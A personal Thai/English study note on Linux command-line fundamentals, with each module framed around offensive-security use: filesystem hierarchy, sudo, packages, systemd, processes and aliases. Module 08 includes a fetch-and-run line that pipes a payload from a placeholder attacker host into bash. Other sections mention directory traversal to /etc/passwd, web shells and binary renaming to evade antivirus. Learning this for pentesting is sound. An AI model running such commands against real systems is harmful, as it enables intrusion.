# 🐧 Linux Fundamentals & CLI Architecture

> **Phase:** `Phase A — Core Foundations` | **Tags:** `#linux` `#foundations` `#cli` `#sysadmin`  
> **Status:** 🔄 In Progress | **Focus:** Linux Command Line, Filesystem, Permissions & Daemons

---

## 📑 Core Modules Overview

- [x] [[#Module 01: Linux CLI Philosophy & Navigation|Module 01: ปรัชญา Linux & เริ่มต้น CLI]]
- [ ] [[#Module 02: Linux Filesystem Hierarchy|Module 02: โครงสร้าง Filesystem Hierarchy]]
- [ ] [[#Module 03: System Manuals & Troubleshooting|Module 03: การใช้ man, --help และการแก้ปัญหา]]
- [ ] [[#Module 04: User Privileges & Sudoers Architecture|Module 04: Users, Groups & สิทธิ์ Sudo]]
- [ ] [[#Module 05: Package Management & Tool Installations|Module 05: Package Management (apt, dpkg, git, pip)]]
- [ ] [[#Module 06: Systemd Services & Daemon Management|Module 06: ควบคุม Systemd Services]]
- [ ] [[#Module 07: Process Monitoring & Signal Handling|Module 07: Process Management & Signals]]
- [ ] [[#Module 08: Lightweight Web Services & HTTP Querying|Module 08: Web Server & curl]]
- [ ] [[#Module 09: Terminal Productive Workflows & Aliases|Module 09: คีย์ลัด Terminal และเทคนิคคำสั่ง]]
- [ ] [[#Module 10: System Diagnostic Breakdown & Recovery|Module 10: การวิเคราะห์และกู้คืนเมื่อระบบพัง]]

---

## Module 01: Linux CLI Philosophy & Navigation
- **Status:** ✅ Completed
- **Core Concept:** ทำไมแฮกเกอร์ถึงใช้ Linux? (Open-source, ควบคุมระดับ Kernel, น้ำหนักเบา, Automate ผ่าน CLI ได้ 100%)

### 📝 Key Notes & Mindset
- Linux ไม่ใช่แค่ OS เดียว แต่คือ **Kernel** ที่ถูกนำมาแจกจ่ายเป็น Distributions (Distros) เช่น Debian, Kali, Ubuntu, Arch
- วิศวกรความปลอดภัยใช้ CLI เพราะรวดเร็ว, ใช้ทรัพยากรน้อย, และสามารถส่ง Output จากคำสั่งหนึ่งต่อไปยังอีกคำสั่งหนึ่งผ่าน Pipe (`|`) ได้

### 💻 Essential Commands
```bash
# ตรวจสอบตัวตนผู้ใช้งานปัจจุบัน
whoami

# ตรวจสอบไดเรกทอรีปัจจุบัน (Print Working Directory)
pwd

# ดูรายชื่อไฟล์และโฟลเดอร์แบบละเอียด
ls -la

# สลับไปยังไดเรกทอรีที่ต้องการ
cd /etc

# ถอยกลับไปยัง Parent Directory 1 ระดับ (Relative Path)
cd ..

# ทางลัดนำทางด่วน (Navigation Shortcuts)
cd ../..       # ถอยกลับ 2 ระดับรวดเดียว
cd -           # สลับกลับไปยังไดเรกทอรีล่าสุดที่เพิ่งจากมา (เสมือนปุ่ม Back)
cd ~           # กลับสู่ Home Directory ทันที (หรือพิมพ์แค่ cd เปล่าๆ)

# ตรวจสอบเวอร์ชันของ Kernel และสถาปัตยกรรมระบบ
uname -a

# ล้างหน้าจอ Terminal (หรือกด Ctrl + L)
clear
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* Linux เป็นทั้ง kernel และ OS คล้ายกับ Windows, Mac แต่เร็วกว่า มีประสิทธิภาพมากกว่า ปลอดภัยกว่า เป็นที่นิยมกว่า โดยเฉพาะ Hacker
- *จุดที่น่าสนใจ / ข้อควรระวัง:* เราเลิกใช้ GUI แต่จะพิมพ์คำสั่งใน Terminal | สัญลักษณ์ '..' (Parent Directory) สำคัญมาก เพราะเป็นรากฐานของช่องโหว่ Directory Traversal (../../../../etc/passwd) ในสาย Web App Pentest

---

## Module 02: Linux Filesystem Hierarchy
- **Status:** ⏳ Not Started (Next Up)
- **Core Concept:** ผ่าโครงสร้างระบบไฟล์ของ Linux ทุกสิ่งทุกอย่างใน Linux คือ 'ไฟล์' (Everything is a file — แม้กระทั่ง Hardware, Process, และ Network Socket)

### 📝 Directory Hierarchy Reference
| Directory | Purpose / Typical Contents | OffSec Relevance |
| :--- | :--- | :--- |
| `/` | Root ของระบบไฟล์ทั้งหมด (จุดเริ่มต้นของทุก Path) | ฐานทัพหลักของระบบ |
| `/bin`, `/usr/bin` | เก็บ Binary คำสั่งมาตรฐานของระบบ (`ls`, `cat`, `grep`, `bash`) | แหล่งหา Living off the Land Binaries (LOLBins) |
| `/sbin`, `/usr/sbin` | เก็บ Binary สำหรับผู้ดูแลระบบ (System Admin binaries: `iptables`, `fdisk`) | คำสั่งยกระดับสิทธิ์ |
| `/etc` | เก็บไฟล์การตั้งค่าระบบ (Configuration files) | จุดล่า Password hashes (`/etc/shadow`), User list (`/etc/passwd`) |
| `/home` | พื้นที่จัดเก็บไฟล์ส่วนตัวของ User ทั่วไป (`/home/username`) | จุดหาข้อมูล Credential, ประวัติคำสั่ง `.bash_history` |
| `/root` | Home directory ของผู้ใช้สิทธิ์สูงสุด (Root user) | Crown Jewel — เป้าหมายสุดท้ายของการยึดเครื่อง |
| `/var` | เก็บข้อมูลที่เปลี่ยนแปลงตลอดเวลา เช่น Logs (`/var/log`), เว็บไซต์ (`/var/www/html`) | แหล่งตรวจ Log หลบหนีร่องรอย หรือวาง Web Shell |
| `/tmp` | เก็บไฟล์ชั่วคราว ทุกคนเขียนได้ (`rwxrwxrwt`) | จุดยอดนิยมสำหรับดร็อป Exploit / Payload ในการยกระดับสิทธิ์ |
| `/dev` | เก็บ Device files ของฮาร์ดแวร์ (`/dev/sda`, `/dev/urandom`, `/dev/null`) | อ้างอิง Raw disk หรือสร้าง Random seed |
| `/proc`, `/sys` | Virtual Filesystem ใน Memory ส่องดูสถานะ Kernel และ Processes | แหล่งอ่านข้อมูลระบบสด ๆ เช่น `/proc/version`, `/proc/cpuinfo` |

### 💻 Essential Commands
```bash
# สำรวจไดเรกทอรีราก
cd /
ls -la

# ดูโครงสร้างแบบต้นไม้ (เจาะลึก 1 ระดับ)
tree -L 1 /

# สร้างโฟลเดอร์ทดลองพร้อมโฟลเดอร์ย่อย
mkdir -p ~/lab/test_dir

# สร้างไฟล์เปล่า
touch ~/lab/test_dir/note.txt

# อ่านเนื้อหาในไฟล์ออกมาแสดงผลบน Terminal (Concatenate)
cat ~/lab/test_dir/note.txt
cat -n /etc/issue               # แสดงเนื้อหาพร้อมกำกับหมายเลขบรรทัด (-n)
cat /etc/os-release             # เปิดอ่านข้อมูล OS ประจำเครื่อง (Reconnaissance พื้นฐาน)

# ย้ายและเปลี่ยนชื่อไฟล์
mv ~/lab/test_dir/note.txt ~/lab/test_dir/targets.txt

# คัดลอกไฟล์
cp ~/lab/test_dir/targets.txt ~/lab/targets_backup.txt

# ลบไฟล์และโฟลเดอร์แบบ Recursive Force
rm -rf ~/lab/test_dir

# ตรวจสอบตำแหน่ง Binary ของคำสั่งใน Filesystem (ค้นหาตามตัวแปร $PATH)
which ls                        # ผลลัพธ์: /usr/bin/ls (พิสูจน์ว่าคำสั่งคือไฟล์ binary ในระบบไฟล์)
which cat                       # ผลลัพธ์: /usr/bin/cat

# สร้างผู้ใช้งานใหม่ในระบบ (สังเกตการสร้างโฟลเดอร์ใน /home และเขียนข้อมูลลง /etc/passwd)
sudo adduser newuser
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* ทุกคำสั่งใน Linux (`ls`, `cat`) แท้จริงแล้วเป็นไฟล์ Executable Binary ที่เก็บอยู่ใน `/bin` หรือ `/usr/bin` ไม่ใช่ฟังก์ชันเวทมนตร์ และระบบทำงานแบบ "Everything is a file" แม้แต่การเพิ่ม user ด้วย `adduser` ก็คือการสร้าง directory ใน `/home/<user>` และเขียนบรรทัดใหม่ลงใน `/etc/passwd`
- *จุดที่น่าสนใจ / ข้อควรระวัง:* เราทดลอง `cd /bin` แล้วใช้ `sudo cp ls newls` ทำให้เราสามารถเรียกใช้ `newls` แทน `ls` ได้ทันที — ในสาย Offensive Security นี่คือแนวคิดของ **Binary Renaming / LOLBins / Persistence** (แฮกเกอร์แอบก๊อปปี้และเปลี่ยนชื่อ binary เพื่อหลบ EDR/Antivirus) และการที่ระบบรู้ว่าต้องไปเรียกโปรแกรมจากโฟลเดอร์ไหน เกิดจากการค้นหาตามตัวแปร `$PATH` (ซึ่งเช็กที่อยู่ไฟล์ได้ด้วย `which`)

---

## Module 03: System Manuals & Troubleshooting
- **Status:** ⏳ Not Started
- **Core Concept:** การหาตัวช่วยเมื่อจำคำสั่งหรือ Flag ไม่ได้ แฮกเกอร์ตัวจริงไม่ได้จำทุกตัวอักษร แต่ 'ค้นหาคู่มือเป็นในเสี้ยววินาที'

### 📝 Key Notes & Mindset
- `man` คือคู่มือทางการที่สมบูรณ์ที่สุด แบ่งเป็น Sections:
  - Section 1: User Commands (`man 1 ls`)
  - Section 5: File Formats (`man 5 passwd`)
  - Section 8: System Administration (`man 8 useradd`)
- เมื่อไม่มี `man` ให้ลอง `--help` หรือ `-h` สำหรับ Quick Option Cheatsheet

### 💻 Essential Commands
```bash
# เปิดคู่มือฉบับเต็มของคำสั่ง (กด q เพื่อออก)
man ls

# ดูคำอธิบายสั้น ๆ บรรทัดเดียวว่าคำสั่งนี้คืออะไร
whatis nmap

# ค้นหาคำสั่งที่เกี่ยวข้องจากคำค้นหา (เมื่อนึกชื่อคำสั่งไม่ออก)
apropos "network"
apropos "firewall"

# ดู Path ที่อยู่ของ Binary ที่ถูกเรียกใช้งานจริง
which python3
whereis bash

# ตรวจสอบว่าเป็น Built-in command หรือ External binary
type cd
type ls
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 04: User Privileges & Sudoers Architecture
- **Status:** ⏳ Not Started
- **Core Concept:** สถาปัตยกรรมสิทธิ์ผู้ใช้งาน (Access Control): Root (UID 0) คือพระเจ้า การบริหารจัดการ Users, Groups และกลไกยกระดับสิทธิ์ผ่าน `sudo`

### 📝 Key Notes & Mindset
- ข้อมูลผู้ใช้เก็บใน `/etc/passwd` (อ่านได้ทุกคน) และ Hash รหัสผ่านเก็บใน `/etc/shadow` (อ่านได้เฉพาะ root)
- การให้สิทธิ์คำสั่งแบบไม่ถามรหัสผ่าน (NOPASSWD) ใน `/etc/sudoers` คือช่องโหว่ Privilege Escalation อันดับต้น ๆ

### 💻 Essential Commands
```bash
# ดู UID, GID และ Groups ของ User ปัจจุบัน
id

# สร้าง User ใหม่พร้อม Home Directory
sudo useradd -m -s /bin/bash operator1

# ตั้งรหัสผ่านให้ User
sudo passwd operator1

# เพิ่ม User เข้ากลุ่ม Sudo (ให้สิทธิ์ยกระดับเป็น Admin)
sudo usermod -aG sudo operator1

# สลับไปยัง User อื่น
su - operator1

# ตรวจสอบสิทธิ์ sudo ที่ตัวเองสามารถรันได้ (หัวใจของ Privilege Escalation Recon)
sudo -l

# ลบ User พร้อมลบ Home Directory ทิ้ง
sudo userdel -r operator1
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 05: Package Management & Tool Installations
- **Status:** ⏳ Not Started
- **Core Concept:** การติดตั้ง อัปเดต และจัดการ Toolchain บน Debian/Kali ผ่าน APT, Debian `.deb` packages, Git source compilation และ Python PIP

### 📝 Key Notes & Mindset
- `apt update` ไม่ได้อัปเกรดโปรแกรม แต่คือการ 'ดาวน์โหลดรายการ Package ล่าสุด' จาก Repository (`/etc/apt/sources.list`)
- `apt upgrade` คือการ 'ติดตั้งเวอร์ชันใหม่' จริง ๆ ให้กับโปรแกรมในเครื่อง

### 💻 Essential Commands
```bash
# อัปเดตรายชื่อแพ็กเกจและอัปเกรดระบบ
sudo apt update && sudo apt upgrade -y

# ค้นหาเครื่องมือในคลัง
apt search seclists

# ติดตั้งแพ็กเกจใหม่
sudo apt install -y gobuster

# ถอนการติดตั้งโปรแกรมพร้อมลบไฟล์ Config ทิ้งทั้งหมด (Purge)
sudo apt purge -y <package_name>

# ติดตั้งไฟล์ Debian .deb จากภายนอก
sudo dpkg -i package_name.deb
sudo apt --fix-broken install -y   # แก้ไขกรณีติด Dependency

# โคลนเครื่องมือสาย OffSec จาก GitHub
git clone https://github.com/danielmiessler/SecLists.git
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 06: Systemd Services & Daemon Management
- **Status:** ⏳ Not Started
- **Core Concept:** การควบคุม Background Services (Daemons) บน Linux: การเปิด Web server, SSH, Database และการทำให้ Service รันอัตโนมัติเมื่อ Boot

### 📝 Key Notes & Mindset
- Services ส่วนใหญ่ใน Linux จัดการผ่าน `systemd` ด้วยคำสั่ง `systemctl`
- การตรวจสอบสถานะ (`status`) จะบอกทั้ง PID, Memory usage และ Error logs ล่าสุดของ Service นั้น

### 💻 Essential Commands
```bash
# ตรวจสอบสถานะของ Service (เช่น SSH หรือ Apache)
systemctl status ssh

# เริ่มต้น / หยุด / รีสตาร์ท Service
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh

# สั่งให้ Service รันอัตโนมัติทุกครั้งที่เปิดเครื่อง (Enable) / ปิดการรันอัตโนมัติ (Disable)
sudo systemctl enable ssh
sudo systemctl disable ssh

# ส่องดูว่ามี Service อะไรกำลังรันอยู่เบื้องหลังทั้งหมดในเครื่อง
systemctl list-units --type=service --state=running

# ดู Live Log ของ Service แบบเรียลไทม์
sudo journalctl -u ssh -f
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 07: Process Monitoring & Signal Handling
- **Status:** ⏳ Not Started
- **Core Concept:** การส่องและควบคุม Process: เข้าใจ Process IDs (PID), ทรัพยากร CPU/RAM และการส่งสัญญาณฆ่า Process ด้วย Signals (`SIGTERM` vs `SIGKILL`)

### 📝 Key Notes & Mindset
- ทุก Process มี PID และ Parent PID (PPID)
- Signal 15 (`SIGTERM`): ขอให้โปรแกรมปิดตัวลงอย่างสุภาพ (Graceful shutdown)
- Signal 9 (`SIGKILL`): สั่งให้ Kernel ตัดการทำงานทันที บังคับปิด 100% ปฏิเสธไม่ได้

### 💻 Essential Commands
```bash
# ส่อง Process ทั้งหมดในระบบแบบละเอียด (Snapshot)
ps aux
ps aux | grep apache

# ส่อง Process แบบ Interactive Live Monitor
top
htop

# ค้นหา PID ของ Process ตามชื่อ
pgrep -l python

# ส่งสัญญาณปิด Process แบบสุภาพ (SIGTERM - ค่าเริ่มต้น)
kill <PID>

# บังคับฆ่า Process ทันทีโดยไม่รอ (SIGKILL - 9)
kill -9 <PID>

# ฆ่า Process ทั้งหมดที่มีชื่อตรงกัน
killall -9 python3
pkill -f "malicious_script.sh"
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 08: Lightweight Web Services & HTTP Querying
- **Status:** ⏳ Not Started
- **Core Concept:** การเปิด Web Server ขนาดเล็กในเสี้ยววินาทีเพื่อใช้ในการส่ง Payload / ดึงข้อมูล และการยิง HTTP Request ผ่าน Terminal ด้วย `curl`

### 📝 Key Notes & Mindset
- ในงาน OffSec การเปิด Local HTTP Server บน Kali คือหัวใจของการส่ง Exploit, Reverse Shell Script หรือรับไฟล์ Exfiltrate จากเครื่องเหยื่อ

### 💻 Essential Commands
```bash
# เปิด Local Web Server ด้วย Python 3 ทันทีในไดเรกทอรีปัจจุบัน (Port 8000)
python3 -m http.server 8000

# ทดสอบยิง Request ดึงเนื้อหาหน้าเว็บผ่าน CLI
curl http://localhost:8000

# ดูเฉพาะ HTTP Response Headers (ตรวจหา Server Version, Status Code)
curl -I https://example.com

# ดาวน์โหลดไฟล์ผ่าน Terminal บันทึกเป็นชื่อเดิม
curl -O http://<target_ip>:8000/linpeas.sh
wget http://<target_ip>:8000/linpeas.sh

# สั่ง Execute Bash Script จาก Web URL โดยไม่ต้องบันทึกลงดิสก์ (Memory Execution)
curl -s http://<attacker_ip>:8000/payload.sh | bash
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 09: Terminal Productive Workflows & Aliases
- **Status:** ⏳ Not Started
- **Core Concept:** คีย์ลัดเร่งความเร็วในการพิมพ์คำสั่ง (Speed & Ergonomics) และการสร้าง Custom Aliases เพื่อเปลี่ยนคำสั่งยาวให้เหลือ 1 ตัวอักษร

### 📝 Terminal Shortcuts Cheat Sheet
| Shortcut | Action & Benefit |
| :--- | :--- |
| `Ctrl + C` | ยกเลิกคำสั่งที่กำลังรันอยู่ทันที (Interrupt) |
| `Ctrl + L` | ล้างหน้าจอ Terminal (เหมือนพิมพ์ `clear`) |
| `Ctrl + R` | ค้นหาประวัติคำสั่งย้อนหลังตามคำค้นหา (Reverse-i-search) |
| `Ctrl + A` | เลื่อนเคอร์เซอร์ไปจุดเริ่มต้นของบรรทัด |
| `Ctrl + E` | เลื่อนเคอร์เซอร์ไปจุดสิ้นสุดของบรรทัด |
| `Ctrl + U` | ลบข้อความตั้งแต่เคอร์เซอร์ย้อนไปต้นบรรทัด |
| `Ctrl + K` | ลบข้อความตั้งแต่เคอร์เซอร์ไปจนสุดบรรทัด |
| `Ctrl + W` | ลบคำศัพท์คำก่อนหน้า 1 คำ |
| `!!` | ดึงคำสั่งล่าสุดกลับมารันซ้ำ (เช่น `sudo !!` เพื่อใส่ sudo ให้คำสั่งเดิม) |
| `!$` | ดึง Argument ตัวสุดท้ายของคำสั่งก่อนหน้า |
| `cd -` | สลับกลับไปยังไดเรกทอรีที่เพิ่งจากมาทันที |

### 💻 Custom Aliases Setup
```bash
# เปิดไฟล์ Config ของ Shell (Zsh บน Kali หรือ Bash บน Ubuntu)
nano ~/.zshrc

# เพิ่ม Aliases ยอดนิยมสำหรับงาน OffSec
alias ll='ls -lah --color=auto'
alias update='sudo apt update && sudo apt upgrade -y'
alias ports='netstat -tulpn'
alias myip='ip -br -c a'

# โหลด Config ให้มีผลทันทีโดยไม่ต้องปิด Terminal
source ~/.zshrc
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 10: System Diagnostic Breakdown & Recovery
- **Status:** ⏳ Not Started
- **Core Concept:** การรับมือเมื่อระบบเกิดปัญหา: การอ่าน System Logs, ตรวจสอบพื้นที่ดิสก์เต็ม, การแก้ปัญหา Network และการใช้ VirtualBox Snapshot ย้อนเวลาระบบ

### 📝 Key Notes & Mindset
- วิศวกรสาย Security ต้องไม่กลัวระบบพัง แต่ต้องมีทักษะในการอ่าน Log เพื่อหาสาเหตุที่แท้จริง (Root Cause Analysis)

### 💻 Essential Commands
```bash
# ส่อง Log กิจกรรมระบบและ Error ล่าสุด
sudo tail -f /var/log/syslog
sudo tail -f /var/log/auth.log     # ส่องดูการพยายาม Login และการใช้ Sudo

# ตรวจสอบพื้นที่จัดเก็บของฮาร์ดดิสก์ทั้งหมด
df -h

# ค้นหาว่าโฟลเดอร์หรือไฟล์ใดกินพื้นที่ในเครื่องมากที่สุด
du -sh /* 2>/dev/null | sort -h

# ซ่อมแซมแพ็กเกจที่เสียหายหรือค้างระหว่างติดตั้ง
sudo apt --fix-broken install
sudo dpkg --configure -a

# ตรวจสอบการเชื่อมต่อเครือข่ายและการตั้งค่า DNS
ip a
ping -c 4 8.8.8.8
cat /etc/resolv.conf
```

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 
